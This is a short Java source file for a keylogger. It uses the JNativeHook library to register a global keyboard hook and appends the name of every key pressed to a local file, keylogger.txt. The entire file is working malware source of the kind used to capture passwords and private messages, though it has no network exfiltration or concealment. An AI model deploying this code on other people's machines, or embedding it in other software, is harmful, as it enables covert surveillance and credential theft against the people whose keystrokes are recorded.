package keylogger;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.StandardOpenOption;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import static java.lang.System.exit;

public class KeyLogger implements NativeKeyListener{
    public static final Path file = Paths.get("keylogger.txt");
    public static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    public static void main(String[] args){
        try{
            GlobalScreen.registerNativeHook();
        }catch (NativeHookException ERROR) {
            logger.error(ERROR.getMessage(),ERROR);
            exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent event) {
        String keyPress = NativeKeyEvent.getKeyText(event.getKeyCode());
        try(OutputStream keylogger = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
             PrintWriter log = new PrintWriter(keylogger))
        {
            log.print(keyPress + "\n");
        }catch (IOException ERROR){
            logger.error(ERROR.getMessage(),ERROR);
            exit(-1);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent event){
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent event){
    }


}